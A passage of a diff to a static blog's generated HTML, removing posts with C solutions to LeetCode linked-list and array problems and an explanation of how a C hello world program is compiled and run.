class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/08/27/33.%20Search%20in%20Rotated%20Sorted%20Array/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -602,445 +1079,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/08/14/27.%20Remove%20Element/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Paradox">
-      <meta itemprop="description" content="What I have learned">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paradox's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/14/27.%20Remove%20Element/" class="post-title-link" itemprop="url">27. Remove Element</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-14 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-14T00:00:00+08:00">2020-08-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-27 10:35:17" itemprop="dateModified" datetime="2020-09-27T10:35:17+08:00">2020-09-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="remove-element">27. Remove Element</h3>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://leetcode.com/problems/remove-element/">source link</a></p>
-</blockquote>
-<h5 id="description">Description</h5>
-<p>Given an array <em>nums</em> and a value <em>val</em>, remove all instances of that value <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/In-place_algorithm"><strong>in-place</strong></a> and return the new length.</p>
-<p>Do not allocate extra space for another array, you must do this by <strong>modifying the input array <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/In-place_algorithm">in-place</a></strong> with O(1) extra memory.</p>
-<p>The order of elements can be changed. It doesn't matter what you leave beyond the new length.</p>
-<h5 id="signature">Signature</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> val)</span></span>;</span><br></pre></td></tr></table></figure>
-<h5 id="analysis">Analysis</h5>
-<p>Nothing to say.</p>
-<h5 id="solution">Solution</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cur = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur &lt; numsSize) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[cur] == val) &#123;</span><br><span class="line">            numsSize--;</span><br><span class="line">            nums[cur] = nums[numsSize];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cur++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/08/12/25.%20Reverse%20Nodes%20in%20k-Group/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Paradox">
-      <meta itemprop="description" content="What I have learned">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paradox's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/12/25.%20Reverse%20Nodes%20in%20k-Group/" class="post-title-link" itemprop="url">25. Reverse Nodes in k-Group</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-12 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-12T00:00:00+08:00">2020-08-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-27 10:35:17" itemprop="dateModified" datetime="2020-09-27T10:35:17+08:00">2020-09-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="reverse-nodes-in-k-group">25. Reverse Nodes in k-Group</h3>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://leetcode.com/problems/reverse-nodes-in-k-group/">source link</a></p>
-</blockquote>
-<h5 id="description">Description</h5>
-<p>Given a linked list, reverse the nodes of a linked list <em>k</em> at a time and return its modified list.</p>
-<p><em>k</em> is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of <em>k</em> then left-out nodes in the end should remain as it is.</p>
-<h5 id="signature">Signature</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">reverseKGroup</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> k)</span></span>;</span><br></pre></td></tr></table></figure>
-<h5 id="analysis">Analysis</h5>
-<ol start="0" type="1">
-<li>Notice that we need to modify the previous node next ptr for every sublist, so we need a <code>real_head</code>.</li>
-</ol>
-<h5 id="solution">Solution</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">reverseKGroup</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> <span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">node_p</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span> || k &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    node real_head;</span><br><span class="line">    real_head.next = head;</span><br><span class="line">    node_p head_ptr = &amp;real_head;</span><br><span class="line">    node_p cur = head_ptr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        node_p right_node = cur;</span><br><span class="line">        node_p left_node = cur-&gt;next;</span><br><span class="line">        node_p temp;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= k; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (right_node == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> head_ptr-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            right_node = right_node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            temp = left_node;</span><br><span class="line">            left_node = left_node-&gt;next;</span><br><span class="line">            temp-&gt;next = right_node;</span><br><span class="line">            right_node = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        node_p local = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = right_node;</span><br><span class="line">        cur = local;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/08/11/24.%20Swap%20Nodes%20in%20Pairs/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Paradox">
-      <meta itemprop="description" content="What I have learned">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paradox's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/11/24.%20Swap%20Nodes%20in%20Pairs/" class="post-title-link" itemprop="url">24. Swap Nodes in Pairs</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-11 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-11T00:00:00+08:00">2020-08-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-27 10:35:17" itemprop="dateModified" datetime="2020-09-27T10:35:17+08:00">2020-09-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="swap-nodes-in-pairs">24. Swap Nodes in Pairs</h3>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://leetcode.com/problems/swap-nodes-in-pairs/">source link</a></p>
-</blockquote>
-<h5 id="description">Description</h5>
-<p>Given a linked list, swap every two adjacent nodes and return its head.</p>
-<p>You may <strong>not</strong> modify the values in the list's nodes, only nodes itself may be changed.</p>
-<h5 id="signature">Signature</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct ListNode* <span class="title">swapPairs</span><span class="params">(struct ListNode* head)</span></span>;</span><br></pre></td></tr></table></figure>
-<h5 id="analysis">Analysis</h5>
-<p>Nothing to say. If they donot give me a real head node, I manually create a <code>real_node</code>.</p>
-<h5 id="solution">Solution</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">swapPairs</span><span class="params">(struct ListNode* head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> <span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">node_p</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node real_head;</span><br><span class="line">    real_head.next = head;</span><br><span class="line">    node_p head_p = &amp;real_head;</span><br><span class="line">    node_p node_prev = head_p;</span><br><span class="line">    node_p node1 = head;</span><br><span class="line">    node_p node2 = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (node2) &#123;</span><br><span class="line">        node_prev-&gt;next = node2;</span><br><span class="line">        node1-&gt;next = node2-&gt;next;</span><br><span class="line">        node2-&gt;next = node1;</span><br><span class="line">        node_prev = node1;</span><br><span class="line">        node1 = node_prev-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(node1==<span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node2 = node1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> real_head.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/08/11/Start%20with%20%22hello%20world%22/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Paradox">
-      <meta itemprop="description" content="What I have learned">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paradox's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/11/Start%20with%20%22hello%20world%22/" class="post-title-link" itemprop="url">Start with "hello world"</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-11 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-11T00:00:00+08:00">2020-08-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-27 10:37:42" itemprop="dateModified" datetime="2020-09-27T10:37:42+08:00">2020-09-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/os/" itemprop="url" rel="index"><span itemprop="name">os</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="start-with-hello-world">Start with "hello world"</h3>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Above is the <code>hello world</code> program written in c, quite easy isn’t it? This is a good example to tell how a text file <code>*.c</code> be executed on machine.</p>
-<p>In this post I will explain this lil program line by line, word by word. Even a tiny program is very complex when you try to fully understand what happened in your computer when you use <code>gcc -o main main.c &amp;&amp; ./main</code> to run this program.</p>
-<p>First line is <code>#include &lt;stdio.h&gt;</code>, that means we include a header file called <code>&lt;stdio.h&gt;</code> in our program, actually this line is not going to be executed, after preprocess, this line will be replaced by entire content in <code>&lt;stdio.h&gt;</code>, which includes plenty of macro define and function declare. In this case, we use this line to import the <code>printf()</code>, we must declare the function before we use it. And it is worth to mention that there is no real <code>printf()</code> in <code>&lt;stdio.h&gt;</code>, the header file only contain the function signature, I will later talk about how this function be included.</p>
-<p>The second line is a function define, which called <code>main</code> and has two parameters <code>argc:int</code> and <code>argv:char const* []</code>. To understand this two parameters, we need to think back how we start this program — <code>./main</code>. And we can pass parameters when run this program like <code>./main arg1 arg2</code>. The <code>argc</code> is the total number of the args and argv is a list contains pointers that point to the args. And don’t forget that <code>./main</code> itself is a parameter in the <code>argv</code> list.</p>
-<p>The third line is the core part to our <code>hello world</code>, it print a message to terminal! But why terminal? All thing in linux is abstract to the file concept. Every process start with three file opened — 0 for <code>stdin</code>, 1 for <code>stdout</code> and 2 for <code>stderr</code>. The 0,1,2 are file descriptors, every process maintain a descriptor table, every descriptor in this table point to a entry in <code>file table</code> which is shared with all processes. The file descriptor may not uniquely point to a entry in <code>file table</code>, we can even use <code>dup2</code> to redirect a file descriptor. And <code>printf</code> only print content to the file descriptor 1, maybe not <code>stdout</code>. But in <code>stdout</code> case, you will see you message in terminal.</p>
-<p>The forth line is the end of <code>main</code>. When your program terminated, you need to tell the operate system which load your program about the termiated state of your program, and <code>0</code> means <code>EXIT_SUCCESS</code>.</p>
-<p>So how this text file named <code>main.c</code> run on your computer? You may recall that <code>gcc -o main main.c</code>. This shell cmd convert the text file <code>main.c</code> to executable file <code>main</code>. And there are four main procedures in that process: preprocess, compile, assemble, link:</p>
-<ul>
-<li>Preprocessor deal with the line start with <code>‘#’</code> like <code>#include&lt;&gt;</code>, <code>#define</code> and etc.</li>
-<li>Compiler compile your c sure code to assemble code depends on your machine.</li>
-<li>Assembler translate the assemble code to binary machine code, and the output of this procedure is already a <code>elf</code> file.(executable and linkable).</li>
-<li>The last procedure is link. Linker link your current <code>elf</code> files and the library, the <code>printf()</code> is really included in this step.</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/08/10/23.%20Merge%20k%20Sorted%20Lists/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Paradox">
-      <meta itemprop="description" content="What I have learned">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paradox's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/10/23.%20Merge%20k%20Sorted%20Lists/" class="post-title-link" itemprop="url">23. Merge k Sorted Lists</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-10 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-10T00:00:00+08:00">2020-08-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-27 10:35:17" itemprop="dateModified" datetime="2020-09-27T10:35:17+08:00">2020-09-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="merge-k-sorted-lists">23. Merge k Sorted Lists</h3>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://leetcode.com/problems/merge-k-sorted-lists/">source link</a></p>
-</blockquote>
-<h5 id="description">Description</h5>
-<p>Merge <em>k</em> sorted linked lists and return it as one sorted list. Analyze and describe its complexity.</p>
-<h5 id="signature">Signature</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct ListNode* <span class="title">mergeKLists</span><span class="params">(struct ListNode** lists, <span class="keyword">int</span> listsSize)</span></span>;</span><br></pre></td></tr></table></figure>
-<h5 id="analysis">Analysis</h5>
-<ol start="0" type="1">
-<li>FIRST OF ALL, ALWAYS ASSUME THAT YOUR INPUT IS OR CONTAIN EMPTY — ALL KINDS OF EMPTY.</li>
-<li>About this problem, we maintain a prior queue (min-heap in my implementation) to iterate all elements in the linked lists. So the time complexity is <span class="math inline">\(O(nlogk)\)</span>.</li>
-<li>Do not forget to ensure the next field in the last element in your linked list is set to <code>NULL</code>.</li>
-<li>People who use linked list without head node are FUCKING ASSHOLES.</li>
-</ol>
-<h5 id="solution">Solution</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">mergeKLists</span><span class="params">(struct ListNode** lists, <span class="keyword">int</span> listsSize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">node_p</span>;</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> <span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (listsSize == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node_p heap[listsSize];</span><br><span class="line">    <span class="keyword">int</span> cur = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; listsSize; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (lists[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            heap[cur++] = lists[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cur == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; cur; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = i;</span><br><span class="line">        <span class="keyword">while</span> (child != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> parent = (child - <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (heap[child]-&gt;val &lt; heap[parent]-&gt;val) &#123;</span><br><span class="line">                node_p temp = heap[child];</span><br><span class="line">                heap[child] = heap[parent];</span><br><span class="line">                heap[parent] = temp;</span><br><span class="line">                child = parent;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> n = cur;</span><br><span class="line">    node head;</span><br><span class="line">    node_p head_ptr = &amp;head;</span><br><span class="line">    head_ptr-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    node_p current = head_ptr;</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        current-&gt;next = (node_p)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        current-&gt;val = heap[<span class="number">0</span>]-&gt;val;</span><br><span class="line">        current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span 